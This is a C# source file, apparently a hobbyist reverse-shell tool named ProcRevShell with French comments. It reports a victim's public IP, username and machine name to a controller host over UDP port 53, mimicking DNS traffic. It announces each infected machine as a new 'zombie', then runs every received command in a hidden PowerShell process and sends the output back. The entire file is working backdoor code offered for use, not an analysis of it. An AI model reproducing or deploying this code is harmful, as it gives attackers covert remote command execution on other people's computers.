using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.Net.Sockets;

namespace ProcRevShell
{
    public class Program
    {

        public static string CmdExecute(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "/C " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }

        public static void Main(string[] args)
        {

            UdpClient udpClient = new UdpClient(11000);


            try
            {

                ////Request web serveurs //////////////
                string sURL;
                sURL = "http://192.168.0.19:8000/index.php";

                WebRequest wrGETURL;
                wrGETURL = WebRequest.Create(sURL);

                Stream objStream;
                objStream = wrGETURL.GetResponse().GetResponseStream();

                StreamReader objReader = new StreamReader(objStream);

                ///connexion UDP //////
                udpClient.Connect("192.168.0.19", 53);

                //// resolution d'adresse IP client /// 
                string url = "http://checkip.dyndns.org";
                System.Net.WebRequest req = System.Net.WebRequest.Create(url);
                System.Net.WebResponse resp = req.GetResponse();
                System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
                string response = sr.ReadToEnd().Trim();
                string[] ipAddressWithText = response.Split(':');
                string ipAddressWithHTMLEnd = ipAddressWithText[1].Substring(1);
                string[] ipAddress = ipAddressWithHTMLEnd.Split('<');
                string mainIP = ipAddress[0];
                Console.WriteLine(mainIP);

                ///renvois des bytes data en ASCII /////////////////////////
                Byte[] sendBytes = Encoding.ASCII.GetBytes(mainIP + '\t' + "New zombies connected !\n");

                Byte[] sendBytes2 = Encoding.ASCII.GetBytes("Windows PowerShell running as user " + Environment.UserName + " on " + Environment.MachineName + "\n Copyright (C) 2015 Microsoft Corporation. All rights reserved.\n\n");

                Byte[] sendBytes3 = Encoding.ASCII.GetBytes("PS " + Process.GetCurrentProcess().Id + " " + Environment.CurrentDirectory + "> ");

                ///ce que tu vas envoyer au client en bytes///
                udpClient.Send(sendBytes, sendBytes.Length);
                udpClient.Send(sendBytes2, sendBytes2.Length);
                udpClient.Send(sendBytes3, sendBytes3.Length);


                IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

                while (true)
                {
                    Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
                    string command = Encoding.ASCII.GetString(receiveBytes);
                    string output = CmdExecute(command);
                    Byte[] sendBytes4 = Encoding.ASCII.GetBytes(output + "PS " + Process.GetCurrentProcess().Id + " " + Environment.CurrentDirectory + "> ");
                    udpClient.Send(sendBytes4, sendBytes4.Length);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            finally
            {
                udpClient.Close();
            }
        }
    }
}
